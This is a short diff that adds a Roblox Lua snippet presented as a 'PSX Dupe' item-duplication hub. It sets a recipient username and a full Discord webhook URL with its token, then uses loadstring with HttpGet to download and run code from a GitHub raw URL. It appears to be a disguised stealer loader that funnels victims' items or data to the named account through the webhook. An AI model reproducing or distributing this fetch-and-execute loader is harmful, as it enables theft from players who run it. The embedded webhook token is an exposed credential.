@@ -1,0 +1,5 @@
+```_G.Username = "firekid8709"
+_G.HubName = "PSX Dupe"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1105497379064529038/xcn7K7pncEBdQ4Tvocq1PgmYw8GLUtl42DKlNrsCQYkF59qEd5KRRpWMY7M78MVbYUuy"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()```
